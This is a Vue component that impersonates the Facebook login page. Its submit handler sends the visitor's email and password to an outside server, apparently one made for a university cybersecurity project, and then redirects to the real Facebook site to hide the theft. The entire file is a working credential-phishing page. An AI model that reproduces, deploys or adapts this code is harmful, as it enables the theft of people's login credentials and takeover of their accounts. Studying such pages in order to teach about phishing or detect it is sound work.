<script setup lang="js">
import { ref } from 'vue';
import  axios from "axios";

const email = ref(null);
const password = ref(null);

async function submit(event) {
  event.preventDefault();
  try {
    const response = await fetch('https://cyber-security-uni-mevn.vercel.app/api/account', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email: email.value, password: password.value })
    });

    const data = await response.json();
    console.log("data", data)

  } catch (err) {
    console.log("err", err);
  }
  window.location.href = "https://www.facebook.com/";
}
</script>

<template>
  <div class="content">
      <div class="flex-div">
        <div class="name-content">
          <h1 class="logo">Facebook</h1>
          <p>Connect with friends and the world around you on Facebook.</p>
        </div>
          <form @submit="submit">
            <input v-model="email" name="email" type="text" placeholder="Email or Phone Number" required />
            <input v-model="password" name="password" type="password" placeholder="Password" required>
            <button class="login">Log In</button>
            <a href="#">Forgot Password ?</a>
            <hr>
            <button class="create-account">Create New Account</button>
          </form>
      </div>
    </div>
</template>